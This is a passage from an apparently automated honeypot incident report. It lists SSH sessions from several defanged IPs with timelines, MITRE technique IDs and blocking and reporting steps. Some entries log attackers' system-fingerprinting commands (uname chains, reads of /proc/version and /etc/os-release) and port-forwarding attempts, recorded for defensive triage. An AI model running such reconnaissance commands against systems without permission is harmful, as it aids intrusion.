| **First Seen** | 2026-07-24 07:03 |
| **Last Seen** | 2026-07-24 07:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:03:01` | `cowrie.session.connect` |
| `2026-07-24 07:03:02` | `cowrie.client.version` |
| `2026-07-24 07:03:02` | `cowrie.client.kex` |
| `2026-07-24 07:03:04` | `cowrie.login.success` |
| `2026-07-24 07:03:04` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:03:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.127[.]190` to AbuseIPDB if not already reported
- [ ] Block `111.171.127[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ea53eb8ccbf

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-24 07:03 |
| **Last Seen** | 2026-07-24 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:03:11` | `cowrie.session.connect` |
| `2026-07-24 07:03:11` | `cowrie.client.version` |
| `2026-07-24 07:03:11` | `cowrie.client.kex` |
| `2026-07-24 07:03:12` | `cowrie.login.success` |
| `2026-07-24 07:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df2e1596c2f3

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-24 07:03 |
| **Last Seen** | 2026-07-24 07:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:03:11` | `cowrie.session.connect` |
| `2026-07-24 07:03:11` | `cowrie.client.version` |
| `2026-07-24 07:03:11` | `cowrie.client.kex` |
| `2026-07-24 07:03:12` | `cowrie.login.success` |
| `2026-07-24 07:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cda0565848c9

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-24 07:03 |
| **Last Seen** | 2026-07-24 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:03:19` | `cowrie.session.connect` |
| `2026-07-24 07:03:19` | `cowrie.client.version` |
| `2026-07-24 07:03:20` | `cowrie.client.kex` |
| `2026-07-24 07:03:20` | `cowrie.login.success` |
| `2026-07-24 07:03:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beeb32a35365

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-24 07:03 |
| **Last Seen** | 2026-07-24 07:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:03:20` | `cowrie.session.connect` |
| `2026-07-24 07:03:20` | `cowrie.client.version` |
| `2026-07-24 07:03:21` | `cowrie.client.kex` |
| `2026-07-24 07:03:21` | `cowrie.login.success` |
| `2026-07-24 07:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3affff895bad

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:03 |
| **Last Seen** | 2026-07-24 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:03:34` | `cowrie.session.connect` |
| `2026-07-24 07:03:34` | `cowrie.client.version` |
| `2026-07-24 07:03:34` | `cowrie.client.kex` |
| `2026-07-24 07:03:35` | `cowrie.login.success` |
| `2026-07-24 07:03:35` | `cowrie.session.params` |
| `2026-07-24 07:03:35` | `cowrie.command.input` |
| `2026-07-24 07:03:35` | `cowrie.log.closed` |
| `2026-07-24 07:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d3d15bf8b59

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:04 |
| **Last Seen** | 2026-07-24 07:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:04:31` | `cowrie.session.connect` |
| `2026-07-24 07:04:31` | `cowrie.client.version` |
| `2026-07-24 07:04:31` | `cowrie.client.kex` |
| `2026-07-24 07:04:34` | `cowrie.login.success` |
| `2026-07-24 07:04:36` | `cowrie.session.params` |
| `2026-07-24 07:04:36` | `cowrie.command.input` |
| `2026-07-24 07:04:36` | `cowrie.command.input` |
| `2026-07-24 07:04:36` | `cowrie.command.input` |
| `2026-07-24 07:04:36` | `cowrie.command.input` |
| `2026-07-24 07:04:36` | `cowrie.command.input` |
| `2026-07-24 07:04:36` | `cowrie.command.success` |
| `2026-07-24 07:04:36` | `cowrie.command.input` |
| `2026-07-24 07:04:36` | `cowrie.command.input` |
| `2026-07-24 07:04:36` | `cowrie.command.input` |
| `2026-07-24 07:04:36` | `cowrie.command.input` |
| `2026-07-24 07:04:37` | `cowrie.log.closed` |
| `2026-07-24 07:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-689f11c4390a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:05 |
| **Last Seen** | 2026-07-24 07:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:05:23` | `cowrie.session.connect` |
| `2026-07-24 07:05:23` | `cowrie.client.version` |
| `2026-07-24 07:05:23` | `cowrie.client.kex` |
| `2026-07-24 07:05:23` | `cowrie.login.success` |
| `2026-07-24 07:05:24` | `cowrie.session.params` |
| `2026-07-24 07:05:24` | `cowrie.command.input` |
| `2026-07-24 07:05:24` | `cowrie.log.closed` |
| `2026-07-24 07:05:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd46c3f3623e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:06 |
| **Last Seen** | 2026-07-24 07:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:06:37` | `cowrie.session.connect` |
| `2026-07-24 07:06:38` | `cowrie.client.version` |
| `2026-07-24 07:06:38` | `cowrie.client.kex` |
| `2026-07-24 07:06:41` | `cowrie.login.success` |
| `2026-07-24 07:06:42` | `cowrie.session.params` |
| `2026-07-24 07:06:42` | `cowrie.command.input` |
| `2026-07-24 07:06:42` | `cowrie.command.input` |
| `2026-07-24 07:06:42` | `cowrie.command.input` |
| `2026-07-24 07:06:42` | `cowrie.command.input` |
| `2026-07-24 07:06:42` | `cowrie.command.input` |
| `2026-07-24 07:06:42` | `cowrie.command.success` |
| `2026-07-24 07:06:42` | `cowrie.command.input` |
| `2026-07-24 07:06:42` | `cowrie.command.input` |
| `2026-07-24 07:06:42` | `cowrie.command.input` |
| `2026-07-24 07:06:42` | `cowrie.command.input` |
| `2026-07-24 07:06:43` | `cowrie.log.closed` |
| `2026-07-24 07:06:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cce3dd75a64d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:07 |
| **Last Seen** | 2026-07-24 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:07:12` | `cowrie.session.connect` |
| `2026-07-24 07:07:12` | `cowrie.client.version` |
| `2026-07-24 07:07:12` | `cowrie.client.kex` |
| `2026-07-24 07:07:13` | `cowrie.login.success` |
| `2026-07-24 07:07:13` | `cowrie.session.params` |
| `2026-07-24 07:07:13` | `cowrie.command.input` |
| `2026-07-24 07:07:13` | `cowrie.log.closed` |
| `2026-07-24 07:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fad11693a00

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:08 |
| **Last Seen** | 2026-07-24 07:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:08:43` | `cowrie.session.connect` |
| `2026-07-24 07:08:44` | `cowrie.client.version` |
| `2026-07-24 07:08:44` | `cowrie.client.kex` |
| `2026-07-24 07:08:46` | `cowrie.login.success` |
| `2026-07-24 07:08:48` | `cowrie.session.params` |
| `2026-07-24 07:08:48` | `cowrie.command.input` |
| `2026-07-24 07:08:48` | `cowrie.command.input` |
| `2026-07-24 07:08:48` | `cowrie.command.input` |
| `2026-07-24 07:08:48` | `cowrie.command.input` |
| `2026-07-24 07:08:48` | `cowrie.command.input` |
| `2026-07-24 07:08:48` | `cowrie.command.success` |
| `2026-07-24 07:08:48` | `cowrie.command.input` |
| `2026-07-24 07:08:48` | `cowrie.command.input` |
| `2026-07-24 07:08:48` | `cowrie.command.input` |
| `2026-07-24 07:08:48` | `cowrie.command.input` |
| `2026-07-24 07:08:49` | `cowrie.log.closed` |
| `2026-07-24 07:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7d005ac9fa4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:08 |
| **Last Seen** | 2026-07-24 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:08:57` | `cowrie.session.connect` |
| `2026-07-24 07:08:57` | `cowrie.client.version` |
| `2026-07-24 07:08:57` | `cowrie.client.kex` |
| `2026-07-24 07:08:58` | `cowrie.login.success` |
| `2026-07-24 07:08:58` | `cowrie.session.params` |
| `2026-07-24 07:08:58` | `cowrie.command.input` |
| `2026-07-24 07:08:58` | `cowrie.log.closed` |
| `2026-07-24 07:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e9081c28e7e

| Field | Detail |
|---|---|
| **Source IP** | `68.7.114[.]69` |
| **First Seen** | 2026-07-24 07:10 |
| **Last Seen** | 2026-07-24 07:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:10:36` | `cowrie.session.connect` |
| `2026-07-24 07:10:36` | `cowrie.client.version` |
| `2026-07-24 07:10:36` | `cowrie.client.kex` |
| `2026-07-24 07:10:37` | `cowrie.login.success` |
| `2026-07-24 07:10:38` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.7.114[.]69` to AbuseIPDB if not already reported
- [ ] Block `68.7.114[.]69` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4ceda5757de

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:10 |
| **Last Seen** | 2026-07-24 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:10:45` | `cowrie.session.connect` |
| `2026-07-24 07:10:45` | `cowrie.client.version` |
| `2026-07-24 07:10:45` | `cowrie.client.kex` |
| `2026-07-24 07:10:46` | `cowrie.login.success` |
| `2026-07-24 07:10:47` | `cowrie.session.params` |
| `2026-07-24 07:10:47` | `cowrie.command.input` |
| `2026-07-24 07:10:47` | `cowrie.log.closed` |
| `2026-07-24 07:10:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43f9145f0eb7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:10 |
| **Last Seen** | 2026-07-24 07:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:10:47` | `cowrie.session.connect` |
| `2026-07-24 07:10:47` | `cowrie.client.version` |
| `2026-07-24 07:10:47` | `cowrie.client.kex` |
| `2026-07-24 07:10:50` | `cowrie.login.success` |
| `2026-07-24 07:10:51` | `cowrie.session.params` |
| `2026-07-24 07:10:51` | `cowrie.command.input` |
| `2026-07-24 07:10:51` | `cowrie.command.input` |
| `2026-07-24 07:10:51` | `cowrie.command.input` |
| `2026-07-24 07:10:51` | `cowrie.command.input` |
| `2026-07-24 07:10:51` | `cowrie.command.input` |
| `2026-07-24 07:10:51` | `cowrie.command.success` |
| `2026-07-24 07:10:51` | `cowrie.command.input` |
| `2026-07-24 07:10:51` | `cowrie.command.input` |
| `2026-07-24 07:10:51` | `cowrie.command.input` |
| `2026-07-24 07:10:51` | `cowrie.command.input` |
| `2026-07-24 07:10:52` | `cowrie.log.closed` |
| `2026-07-24 07:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-785cd5095fbb

| Field | Detail |
|---|---|
| **Source IP** | `211.115.191[.]84` |
| **First Seen** | 2026-07-24 07:10 |
| **Last Seen** | 2026-07-24 07:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:10:47` | `cowrie.session.connect` |
| `2026-07-24 07:10:48` | `cowrie.client.version` |
| `2026-07-24 07:10:48` | `cowrie.client.kex` |
| `2026-07-24 07:10:51` | `cowrie.login.success` |
| `2026-07-24 07:10:51` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.115.191[.]84` to AbuseIPDB if not already reported
- [ ] Block `211.115.191[.]84` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba8f9c1a3fa2

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:12 |
| **Last Seen** | 2026-07-24 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:12:40` | `cowrie.session.connect` |
| `2026-07-24 07:12:40` | `cowrie.client.version` |
| `2026-07-24 07:12:40` | `cowrie.client.kex` |
| `2026-07-24 07:12:40` | `cowrie.login.success` |
| `2026-07-24 07:12:41` | `cowrie.session.params` |
| `2026-07-24 07:12:41` | `cowrie.command.input` |
| `2026-07-24 07:12:41` | `cowrie.log.closed` |
| `2026-07-24 07:12:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61ec8d50530c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:12 |
| **Last Seen** | 2026-07-24 07:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:12:50` | `cowrie.session.connect` |
| `2026-07-24 07:12:50` | `cowrie.client.version` |
| `2026-07-24 07:12:50` | `cowrie.client.kex` |
| `2026-07-24 07:12:53` | `cowrie.login.success` |
| `2026-07-24 07:12:54` | `cowrie.session.params` |
| `2026-07-24 07:12:54` | `cowrie.command.input` |
| `2026-07-24 07:12:54` | `cowrie.command.input` |
| `2026-07-24 07:12:54` | `cowrie.command.input` |
| `2026-07-24 07:12:54` | `cowrie.command.input` |
| `2026-07-24 07:12:54` | `cowrie.command.input` |
| `2026-07-24 07:12:54` | `cowrie.command.success` |
| `2026-07-24 07:12:54` | `cowrie.command.input` |
| `2026-07-24 07:12:54` | `cowrie.command.input` |
| `2026-07-24 07:12:54` | `cowrie.command.input` |
| `2026-07-24 07:12:54` | `cowrie.command.input` |
| `2026-07-24 07:12:55` | `cowrie.log.closed` |
| `2026-07-24 07:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce0c0db90de5

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]123` |
| **First Seen** | 2026-07-24 07:13 |
| **Last Seen** | 2026-07-24 07:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:13:49` | `cowrie.session.connect` |
| `2026-07-24 07:13:50` | `cowrie.client.version` |
| `2026-07-24 07:13:50` | `cowrie.client.kex` |
| `2026-07-24 07:13:51` | `cowrie.login.success` |
| `2026-07-24 07:13:52` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:13:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]123` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e48b7fc7f463

| Field | Detail |
|---|---|
| **Source IP** | `179.185.18[.]67` |
| **First Seen** | 2026-07-24 07:13 |
| **Last Seen** | 2026-07-24 07:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:13:56` | `cowrie.session.connect` |
| `2026-07-24 07:13:57` | `cowrie.client.version` |
| `2026-07-24 07:13:57` | `cowrie.client.kex` |
| `2026-07-24 07:13:59` | `cowrie.login.success` |
| `2026-07-24 07:13:59` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:14:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.18[.]67` to AbuseIPDB if not already reported
- [ ] Block `179.185.18[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e80ed2755cd3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:14 |
| **Last Seen** | 2026-07-24 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:14:33` | `cowrie.session.connect` |
| `2026-07-24 07:14:33` | `cowrie.client.version` |
| `2026-07-24 07:14:33` | `cowrie.client.kex` |
| `2026-07-24 07:14:33` | `cowrie.login.success` |
| `2026-07-24 07:14:34` | `cowrie.session.params` |
| `2026-07-24 07:14:34` | `cowrie.command.input` |
| `2026-07-24 07:14:34` | `cowrie.log.closed` |
| `2026-07-24 07:14:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
